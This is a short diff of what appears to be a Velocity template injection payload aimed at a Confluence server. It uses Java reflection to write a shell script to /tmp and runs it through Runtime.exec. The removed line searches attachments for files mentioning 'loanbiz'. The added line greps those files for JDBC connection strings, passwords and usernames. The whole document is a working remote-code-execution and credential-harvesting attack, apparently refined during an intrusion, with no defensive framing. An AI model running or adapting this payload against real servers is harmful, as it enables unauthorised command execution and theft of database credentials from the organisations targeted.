@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("nohup sh -c 'find /u01/confluence-home/attachments/ver003 -type f -size -200k -exec grep -l -i loanbiz {} + > /tmp/grep_loanbiz.txt 2>/dev/null' >/dev/null 2>&1 & echo STARTED; sleep 40; wc -l /tmp/grep_loanbiz.txt 2>&1; head -20 /tmp/grep_loanbiz.txt 2>&1")
+$w2.write("xargs -a /tmp/grep_loanbiz.txt grep -iH -E 'jdbc:mysql.*loanbiz|loanbiz.*password|password.*loanbiz|username|user *=' 2>/dev/null | grep -iv 'create table\|insert into\|select ' | head -35")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
